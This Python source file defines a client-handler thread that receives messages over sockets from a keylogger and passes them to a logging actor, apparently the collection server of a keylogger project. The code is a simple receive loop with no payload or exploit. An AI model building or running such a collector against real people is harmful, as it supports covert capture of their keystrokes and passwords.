'''
File: ClientHandler.py
Author: Christopher A. Wood, caw4567@rit.edu
'''

import socket
import ssl
import threading
import struct
import string
import Queue
import Logger

# The Python logging module
import logging

class ClientHandler(threading.Thread):
	''' This is an active thread that is responsible for serving all
	messages that come in from the keylogger. It simply strips
	them out of the socket and forwards them along to the logger
	actor via a message dictionary.
	'''

	def __init__(self, serv):
		''' Initialize the client handler with the parent server (TrafficProxy)
		'''
		threading.Thread.__init__(self)
		self.server = serv
		self.clientList = []
		self.running = True

		# Setup the Python logger
		self.lgr = logging.getLogger('abls')
		self.lgr.setLevel(logging.DEBUG)
		fh = logging.FileHandler('abls.log')
		fh.setLevel(logging.WARNING)
		frmt = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
		fh.setFormatter(frmt)
		self.lgr.addHandler(fh)

		# Set the properties for this session.
		self.logger = Logger.Logger()
		self.queue = self.logger.getQueue()
		self.logger.start()

	def run(self):
		''' The main loop for this cliet handler thread. Simply strip messages
		out of the socket and send them to the logger for processing.
		'''
		while self.running:
			for client in self.clientList:
				try:
					message = client.sock.recv(self.server.BUFFSIZE)
					#message = client.connstream.read() # this was for SSL-wrapped information
					if message != None and message != "":
						self.handleMessage(message)
					else:
						self.running = False
				except:
					self.running = False

		print("Terminating the client handler")
		self.logger.endSession()
		self.logger.stop()

	def handleMessage(self, message):
		''' Handle a client message.
		'''
		self.lgr.debug("client message: ", message)
		#print("client message: ", message) # debug 
		self.queue.put(message)
